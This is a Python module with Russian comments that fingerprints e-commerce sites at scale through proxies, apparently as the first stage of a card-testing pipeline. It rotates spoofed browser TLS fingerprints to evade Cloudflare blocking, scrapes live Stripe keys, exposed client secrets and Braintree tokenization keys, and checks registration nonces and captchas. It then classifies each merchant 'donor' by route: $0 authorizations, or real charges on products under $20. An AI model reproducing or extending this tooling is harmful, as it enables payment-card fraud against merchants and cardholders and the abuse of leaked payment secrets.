# language: Python 3.12+, file: surface.py, target: Windows 11, deps: curl_cffi
# Раунд 10 (S1): пассивный отпечаток поверхности — три GET, ни одной мутации.
#
# Решает, ЧТО это за сайт и КАКИЕ векторы по нему вообще возможны, ценой трёх
# дешёвых запросов вместо полного цикла регистрации v1. Каждый отказ получает
# причину из funnel.REASONS — мусорная корзина NO_REG больше не наполняется.
import asyncio
import os
import re
import sys
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import gate_client as gc
import funnel
import config as _cfg

try:                       # единственный источник правды о крышке цены
    from store_gate import MAX_PRICE_CENTS
except Exception:          # noqa: BLE001
    MAX_PRICE_CENTS = 2000  # $20; ниже $2 работали только 2 сайта из 44

LANG_RE = re.compile(r'<html[^>]*lang="([a-z]{2})[-_"]', re.I)
CURRENCY_RE = re.compile(r'"currency_code"\s*:\s*"([A-Z]{3})"')
# Без обязательного ведущего слэша: в HTML путь может быть относительным
# или приходить из атрибута без /.
WOO_MARKERS = ("wp-content/plugins/woocommerce", "woocommerce", "wc-stripe")
WP_MARKERS = ("wp-content/", "wp-includes/", "wp-json/", "wp-emoji-release")

# TLD -> страна биллинга
TLD_GEO = {"au": "AU", "nz": "NZ", "uk": "GB", "gb": "GB", "ie": "IE", "ca": "CA",
           "us": "US", "de": "DE", "at": "AT", "ch": "CH", "it": "IT", "es": "ES",
           "fr": "FR", "nl": "NL", "be": "BE", "se": "SE", "no": "NO", "dk": "DK",
           "fi": "FI", "pl": "PL", "pt": "PT", "jp": "JP", "sg": "SG", "za": "ZA",
           "in": "IN", "br": "BR", "mx": "MX", "co": "CO", "eu": "DE"}


def blank(domain: str) -> dict:
    return {"domain": domain, "canonical_host": domain, "base_url": "",
            "platform": "unknown", "payments": {}, "geo": {}, "cheapest_cents": None,
            "alive": False, "routes": [], "reason": "UNKNOWN", "ms": 0}


def _geo(domain: str) -> dict:
    tld = domain.rsplit(".", 1)[-1].lower()
    return {"tld": tld, "country": TLD_GEO.get(tld, "US")}


def _platform(html: str, shopify_ok: bool, woo_blocks: bool) -> str:
    if shopify_ok:
        return "shopify"
    if woo_blocks:
        return "woo_blocks"
    low = (html or "").lower()
    if any(m in low for m in WOO_MARKERS):
        return "woo_legacy"
    if any(m in low for m in WP_MARKERS):
        return "wordpress"
    return "other"


def _routes(fp: dict) -> list[str]:
    """S2: отпечаток -> возможные векторы. Отсечь невозможное ДО дорогих проб."""
    r = []
    plat, pay = fp["platform"], fp["payments"]
    if plat == "shopify":
        r.append("shopify")
    if plat in ("woo_blocks", "woo_legacy"):
        # pk_live не обязателен на витрине: слаг карты из /cart — тоже основание,
        # ключ достанется на /checkout/. Иначе теряем живых доноров вроде
        # blackbeltprotein.com.au, у которых pk только под авторизацией.
        if pay.get("stripe_pk") or _card_method_slug(pay.get("methods") or []):
            # setupwoo — $0-авторизация, цена товара не важна.
            # storegate — РЕАЛЬНОЕ списание на сумму самого дешёвого товара,
            # значит крышка MAX_PRICE_CENTS обязательна. Знаем цену и она выше
            # крышки — не создаём ложный маршрут, который заведомо утонет
            # в «no product under cap» уже после токенизации карты.
            # D-34: reg_nonce + капча на регистрации = донор фантомный.
            # Проверено боем 2026-08-31: 7 из 7 таких доменов дали ERROR,
            # ни один зонд не дошёл до Stripe. Маршрут не создаём.
            if pay.get("reg_nonce") and not pay.get("reg_captcha") and not pay.get("add_pm_404"):
                r.append("setupwoo")
            cheap = fp.get("cheapest_cents")
            if cheap is None or cheap <= MAX_PRICE_CENTS:
                r.append("storegate")
            else:
                fp["over_cap"] = cheap
        if pay.get("braintree"):
            r.append("braintreenvbv")
    if pay.get("secret_exposed"):
        r.append("piconfirm")
    # пишем сами: функция уже мутирует fp (over_cap), пусть будет одна точка
    # правды об отпечатке, а не «вернуть список и надеяться, что caller запишет»
    fp["routes"] = r
    return r


# D-34: маркеры капчи в ФОРМЕ РЕГИСТРАЦИИ.
# Отличается от _VISIBLE_CAPTCHA: там спрашивают «нас остановили на витрине»,
# здесь — «можно ли вообще создать учётку». Смотрим только форму регистрации,
# иначе любой сайт с виджетом hCaptcha в футере станет «закрытым» — та же
# ошибка выжившего, что уже стоила нам allbirds.com, но в другую сторону.
_REG_CAPTCHA_MARKERS = (
    "g-recaptcha", "recaptcha", "hcaptcha", "h-captcha",
    "cf-turnstile", "cf_challenge", "turnstile", "challenges.cloudflare",
)


def reg_captcha_marker(html: str) -> str | None:
    """Маркер капчи в форме регистрации или None, если форма чистая."""
    if not html:
        return None
    form = ""
    try:
        form = gc.extract_register_form_html(html) or ""
    except Exception:                                       # noqa: BLE001
        form = ""
    low = form.lower()
    for m in _REG_CAPTCHA_MARKERS:
        if m in low:
            return m
    # капча может жить вне <form> — фолбэк на всю страницу, но помечаем
    low_all = html.lower()
    for m in _REG_CAPTCHA_MARKERS:
        if m in low_all:
            return m + " (page)"
    return None


def _ms(t0) -> int:
    return int((asyncio.get_event_loop().time() - t0) * 1000)


# --- Детекторы блокировки, откалиброванные под ВИТРИНУ -----------------------
# ВАЖНО: gc.is_cloudflare_challenge() и gc.looks_like_captcha() здесь НЕ годятся.
# Они заточены под узкую страницу add-payment-method. На витрине они срабатывают
# от любого упоминания: сайт, просто подключивший скрипт hCaptcha или виджет
# Turnstile к форме логина, объявляется заблокированным. Проверено боем —
# allbirds.com и atriumcoffeeroasters.com были ошибочно убиты как CAPTCHA.
# Здесь нужен не «признак присутствует», а «нас реально остановили».

_SCRIPT_RE = re.compile(r"<(script|style)\b.*?</\1>", re.I | re.S)
_CF_TITLE_RE = re.compile(r"<title>\s*(just a moment|attention required|sorry, you have been blocked)", re.I)
_VISIBLE_CAPTCHA = (
    "complete the security check",
    "verify you are human",
    "please verify that you are human",
    "enable javascript and cookies to continue",
    "checking your browser before accessing",
    "unusual traffic from your",
)


# Пул отпечатков TLS. Порядок = приоритет, НО при 429/403 идёт сдвиг.
#
# D-30 (боем, 2026-08-31): chrome120 и новее (120/124/131) систематически
# режутся Cloudflare429 на витринах — новейший отпечаток самый заезженный,
# по нему и узнают сканер. Проверено на 4 доменах: chrome131/124/120 → 429,
# chrome116 и старше + все safari/firefox133/edge/tor → 200.
# firefox120 падает с EXC (нестабилен) — исключён.
IMPERSONATIONS = _cfg.IMPERSONATIONS
_THROTTLE_CODES = (403, 429, 503)


class _Throttled(Exception):
    """Все отпечатки получили 429/403 — витрина нас не пускает."""


async def _get_throttled(domain, proxy, timeout, tries=3):
    """Витрина с ротацией отпечатка. Отдаёт первый не-429/403 ответ.
    Перебирает до tries отпечатков из пула, начиная со случайного сдвига —
    иначе весь пул синхронно долбится одним и тем же и снова ловит 429."""
    import random
    last = None
    offset = random.randrange(len(IMPERSONATIONS))
    order = [IMPERSONATIONS[(offset + i) % len(IMPERSONATIONS)] for i in range(len(IMPERSONATIONS))]
    for imp in order[:max(1, tries)]:
        try:
            async with AsyncSession(impersonate=imp, verify=False, proxy=proxy) as s:
                r = await s.get(f"https://{domain}", timeout=timeout)
            if r.status_code not in _THROTTLE_CODES:
                return r, imp
            last = r
        except Exception as e:                       # noqa: BLE001
            low = str(e).lower()
            if "timed out" in low or "timeout" in low:
                raise TimeoutError(str(e)) from e
            last = e
            continue
    if isinstance(last, Exception):
        raise last
    raise _Throttled(getattr(last, "status_code", 0))


def cf_blocked(resp) -> bool:
    """Нас реально держит Cloudflare: статус отказа + след CF, либо интерстициал."""
    if getattr(resp, "status_code", 200) not in (403, 429, 503):
        return False
    hdrs = {k.lower() for k in (getattr(resp, "headers", None) or {})}
    return ("cf-ray" in hdrs or "cf-mitigated" in hdrs
            or bool(_CF_TITLE_RE.search(resp.text or "")))


def captcha_blocked(html: str) -> bool:
    """Видимый текст интерстициала. Скрипты и стили вырезаны — иначе ложь."""
    text = _SCRIPT_RE.sub(" ", html or "").lower()
    return any(m in text for m in _VISIBLE_CAPTCHA)


def _card_method_slug(methods: list[str]) -> str | None:
    """Есть ли в списке слаг, способный принять карту. None — если только кошельки."""
    for m in methods:
        if "stripe" in m or "woocommerce_payments" == m or m.endswith("_cc") or "card" in m:
            if not gc._PM_WALLET_RX.search(m):
                return m
    return None


async def fingerprint(domain: str, sem: asyncio.Semaphore,
                      proxy_pool: list[str] | None = None,
                      explicit_proxy: str | None = None,
                      timeout: int = 12) -> dict:
    """Один домен -> отпечаток. Никогда не бросает: всегда dict с reason."""
    fp = blank(domain)
    fp["geo"] = _geo(domain)
    t0 = asyncio.get_event_loop().time()

    async with sem:
        try:
            proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
            # --- 1. витрина: канонический хост + платформа + ключи -------------
            # D-30: ротация отпечатка. Один и тот же chrome131 на 53% корпуса
            # давал Cloudflare429, и воронка хоронила живые сайты как HTTP_4XX.
            try:
                r0, imp_used = await _get_throttled(domain, proxy, timeout, tries=3)
            except TimeoutError:
                fp["reason"] = "TIMEOUT"; fp["ms"] = _ms(t0); return fp
            except _Throttled as e:
                fp["reason"] = "RATE_LIMITED"
                fp["note"] = f"все отпечатки дали {e.args[0] if e.args else '4xx'}"
                fp["ms"] = _ms(t0)
                return fp
            except Exception as e:                               # noqa: BLE001
                low = str(e).lower()
                fp["reason"] = "TIMEOUT" if ("timed out" in low or "timeout" in low) else "DNS_FAIL"
                fp["ms"] = _ms(t0)
                return fp
            fp["impersonate"] = imp_used

            async with AsyncSession(impersonate=imp_used, verify=False,
                                    proxy=proxy) as s:
                if r0.status_code >= 500:
                    fp["reason"] = "HTTP_5XX"; fp["ms"] = _ms(t0); return fp
                if r0.status_code >= 400:
                    fp["reason"] = "HTTP_4XX"; fp["ms"] = _ms(t0); return fp

                # канонический хост: редирект разрешён, запоминаем финальный
                host = (urlparse(str(r0.url)).netloc or domain).lower()
                fp["canonical_host"] = host
                fp["base_url"] = f"https://{host}"

                html = r0.text or ""
                if cf_blocked(r0):
                    fp["reason"] = "CF_CHALLENGE"; fp["ms"] = _ms(t0); return fp
                if captcha_blocked(html):
                    fp["reason"] = "CAPTCHA"; fp["ms"] = _ms(t0); return fp

                root = fp["base_url"]
                bt = gc.extract_braintree_keys(html)
                secrets = gc.extract_client_secrets(html)
                m_lang = LANG_RE.search(html)
                fp["payments"] = {
                    "stripe_pk": gc.extract_pk_live(html) or "",
                    "test_mode": ("pk_test_" in html and "pk_live_" not in html),
                    "braintree": bool(bt.get("has_braintree")),
                    "bt_tokenization_key": bt.get("tokenization_key", ""),
                    "secret_exposed": bool(secrets),
                    "secret_count": len(secrets),
                    "methods": [],
                    "reg_nonce": bool(gc.extract_reg_nonce(html)),
                }
                if m_lang:
                    fp["geo"]["lang"] = m_lang.group(1).upper()
                m_cur = CURRENCY_RE.search(html)
                if m_cur:
                    fp["geo"]["currency"] = m_cur.group(1)

                # --- 2. Shopify? /products.json -------------------------------
                shopify_ok = False
                try:
                    rp = await s.get(f"{root}/products.json?limit=50", timeout=timeout)
                    if rp.status_code == 200 and "json" in (rp.headers.get("content-type") or "").lower():
                        j = rp.json()
                        if isinstance(j, dict) and isinstance(j.get("products"), list):
                            shopify_ok = True
                            prices = []
                            for p in j["products"]:
                                for v in (p.get("variants") or []):
                                    try:
                                        c = int(float(v.get("price") or 0) * 100)
                                    except (TypeError, ValueError):
                                        continue
                                    if c > 0 and v.get("available") is not False:
                                        prices.append(c)
                            fp["cheapest_cents"] = min(prices) if prices else None
                            fp["catalog_size"] = len(j["products"])
                except Exception:
                    pass

                # --- 3. Woo Store API? /cart -> nonce + слаги оплат -----------
                woo_blocks = False
                try:
                    rc = await s.get(f"{root}/wp-json/wc/store/v1/cart", timeout=timeout)
                    if rc.status_code == 200:
                        if rc.headers.get("nonce") or rc.headers.get("Nonce"):
                            woo_blocks = True
                            fp["store_nonce"] = True
                        try:
                            cj = rc.json()
                        except Exception:
                            cj = {}
                        # D-28: payment_methods — список СТРОК, не объектов
                        fp["payments"]["methods"] = [m for m in (cj.get("payment_methods") or [])
                                                     if isinstance(m, str)]
                        fp["payments"]["needs_shipping"] = bool(cj.get("needs_shipping"))
                except Exception:
                    pass

                fp["platform"] = _platform(html, shopify_ok, woo_blocks)
                fp["alive"] = True

                # --- 3a. Woo: каталог и цена ----------------------------------
                # Без этого «дешёвый товар» для Woo остаётся None, и крышка
                # MAX_PRICE_CENTS не проверяется до самого чекаута — ровно та
                # слепота, из которой вырос D-23 («нет товара под крышкой»,
                # хотя товаров под крышкой не было вообще). Один GET, дешёвый.
                if fp["platform"] in ("woo_blocks", "woo_legacy"):
                    try:
                        rpr = await s.get(f"{root}/wp-json/wc/store/v1/products",
                                          params={"per_page": 50}, timeout=timeout)
                        if rpr.status_code == 200 and "json" in (
                                rpr.headers.get("content-type") or "").lower():
                            items = rpr.json()
                            if isinstance(items, list):
                                prices = []
                                for p in items:
                                    if not isinstance(p, dict):
                                        continue
                                    raw = ((p.get("prices") or {}).get("price"))
                                    try:
                                        c = int(str(raw))
                                    except (TypeError, ValueError):
                                        continue
                                    # Woo отдаёт цену в минорных единицах строкой
                                    if 0 < c <= 10_000_00:
                                        prices.append(c)
                                if prices:
                                    fp["cheapest_cents"] = min(prices)
                                fp["catalog_size"] = len(items)
                    except Exception:                           # noqa: BLE001
                        pass

                # --- 3b. Woo: есть ли открытая регистрация? -------------------
                # reg-nonce живёт на /my-account/, а не на витрине. Без этого
                # запроса мы слепы к setupwoo-вектору и не можем закрыть A4
                # (второй $0-донор): blackbeltprotein терял маршрут именно здесь.
                if fp["platform"] in ("woo_blocks", "woo_legacy", "wordpress"):
                    try:
                        rm = await s.get(f"{root}/my-account/", timeout=timeout)
                        if rm.status_code == 200:
                            nonce = gc.extract_reg_nonce(rm.text or "")
                            if nonce:
                                fp["payments"]["reg_nonce"] = True
                                fp["payments"]["reg_nonce_value"] = nonce
                                fp["my_account"] = True
                                # D-34: сам по себе nonce НЕ значит, что учётку
                                # можно создать. Woo отдаёт форму регистрации с
                                # reCAPTCHA, и тогда зонд до Stripe не доходит:
                                # 7 из 7 доноров раунда 10 умерли ровно здесь.
                                cap = reg_captcha_marker(rm.text or "")
                                if cap:
                                    fp["payments"]["reg_captcha"] = cap
                                else:
                                    # Быстрая проверка: включено ли вообще сохранение карт в WooCommerce.
                                    # Если отдаёт 404 — сохранение отключено, setupwoo невозможен.
                                    try:
                                        rpm = await s.get(f"{root}/my-account/add-payment-method/", timeout=6)
                                        if rpm.status_code == 404:
                                            fp["payments"]["add_pm_404"] = True
                                    except Exception:
                                        pass
                            if not fp["payments"].get("stripe_pk"):
                                fp["payments"]["stripe_pk"] = gc.extract_pk_live(rm.text or "") or ""
                    except Exception:
                        pass

                # --- 3c. Woo: чекаут-страница (/checkout/) -------------------
                # Большинство современных Woo-магазинов подключают stripe.js / UPE
                # только на странице чекаута (/checkout/ или /cart/).
                if fp["platform"] in ("woo_blocks", "woo_legacy", "wordpress"):
                    if not fp["payments"].get("stripe_pk"):
                        try:
                            r_chk = await s.get(f"{root}/checkout/", timeout=timeout)
                            if r_chk.status_code == 200 and r_chk.text:
                                pk_chk = gc.extract_pk_live(r_chk.text)
                                if pk_chk:
                                    fp["payments"]["stripe_pk"] = pk_chk
                        except Exception:
                            pass

                # --- 4. вердикт S1 ---------------------------------------------
                pay = fp["payments"]
                if fp["platform"] == "other":
                    fp["reason"] = "NOT_WORDPRESS"
                elif fp["platform"] == "wordpress":
                    fp["reason"] = "NOT_WOO"
                elif fp["platform"] == "woo_legacy":
                    if not (pay.get("stripe_pk") or pay.get("reg_nonce") or pay.get("braintree") or pay.get("secret_exposed")):
                        fp["reason"] = "NO_STORE_API"
                elif pay.get("test_mode"):
                    fp["reason"] = "TEST_MODE_PK"
                elif fp["platform"] != "shopify" and not (
                        pay.get("stripe_pk") or pay.get("braintree")
                        or pay.get("secret_exposed") or _card_method_slug(pay.get("methods") or [])):
                    # Shopify pk_live на витрине не отдаёт — чекаут его поднимает сам.
                    fp["reason"] = "NO_STRIPE_PK"
                else:
                    fp["reason"] = None
                    # pk_live часто живёт ТОЛЬКО за авторизацией (add-payment-method).
                    # Слаг карты из /cart — достаточное основание идти в storegate:
                    # store_api_confirm сам достанет ключ с /checkout/.
                    if not pay.get("stripe_pk"):
                        fp["pk_deferred"] = True

                fp["routes"] = _routes(fp)
                if not fp["routes"] and fp["reason"] is None:
                    fp["reason"] = "NO_ROUTE"
                fp["ms"] = _ms(t0)
                return fp
        except Exception as e:
            fp["reason"] = "UNKNOWN"
            fp["error"] = str(e)[:160]
            fp["ms"] = _ms(t0)
            return fp


async def sweep(domains: list[str], concurrency: int = 24,
                proxy_pool: list[str] | None = None,
                explicit_proxy: str | None = None,
                verbose: bool = True) -> list[dict]:
    """Прогон списка доменов -> отпечатки. Каждую смерть пишет в funnel."""
    sem = asyncio.Semaphore(concurrency)
    results = await asyncio.gather(
        *[fingerprint(d, sem, proxy_pool, explicit_proxy) for d in domains],
        return_exceptions=True)

    out, rows = [], []
    for d, r in zip(domains, results):
        if isinstance(r, Exception):
            err_msg = str(r)
            r = blank(d)
            r["reason"] = "UNKNOWN"
            r["error"] = err_msg[:160]
        out.append(r)
        rows.append((d, "S1", r["reason"] or "ALIVE", r.get("ms"),
                     f"plat={r['platform']}" if r["alive"] else None))
    funnel.record_many(rows)
    if verbose:
        alive = [r for r in out if r["alive"]]
        print(f"[S1] {len(out)} доменов → живых {len(alive)} | "
              f"маршрутов всего {sum(len(r['routes']) for r in out)}")
    return out


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="S1: пассивный отпечаток поверхностей")
    ap.add_argument("target", nargs="?", help="домен или файл со списком")
    ap.add_argument("--concurrency", type=int, default=24)
    ap.add_argument("--proxy", default=None)
    a = ap.parse_args()

    if a.target and os.path.exists(a.target):
        doms = [l.strip() for l in open(a.target, encoding="utf-8")
                if l.strip() and not l.startswith("#")]
    elif a.target:
        doms = [a.target]
    else:
        import config
        import domains_store
        domains_store.init_db()
        doms = [r["domain"] for r in domains_store.due_for_scan(hours=config.RESCAN_INTERVAL_HOURS)]

    funnel.init_db()
    asyncio.run(sweep(doms, concurrency=a.concurrency, explicit_proxy=a.proxy))
    print()
    print(funnel.report())
